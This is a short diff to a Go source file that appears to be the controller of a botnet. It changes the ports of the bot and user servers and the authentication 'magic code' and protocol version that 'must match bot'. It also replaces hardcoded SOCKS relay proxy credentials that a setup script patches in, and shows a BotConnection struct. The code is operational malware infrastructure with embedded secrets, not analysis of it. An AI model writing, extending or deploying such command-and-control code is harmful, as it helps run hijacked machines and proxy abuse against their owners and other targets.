@@ -38,19 +38,19 @@ const (
 
 	// Server ports
 	BOT_SERVER_PORT  = "443" // do not change
-	USER_SERVER_PORT = "420"
+	USER_SERVER_PORT = "210"
 
 	// Authentication  these must match bot
-	MAGIC_CODE       = "bYcY7ti3gnS5E!#h"
-	PROTOCOL_VERSION = "V3_2"
+	MAGIC_CODE       = "CBjwz*5VBoj0IABQ"
+	PROTOCOL_VERSION = "V5_0"
 )
 
 // bakedRelayEndpoints holds relay addresses patched in by setup.py.
 // Format: "host:controlPort:socksPort" separated by commas.
 // Empty string means no pre-configured relays.
 var bakedRelayEndpoints = "" // change me run setup.py
-var bakedProxyUser = "vision"                            // change me run setup.py
-var bakedProxyPass = "vision"                            // change me run setup.py
+var bakedProxyUser = "AffSA"                            // change me run setup.py
+var bakedProxyPass = "AffSA"                            // change me run setup.py
 
 type BotConnection struct {
 	conn          net.Conn
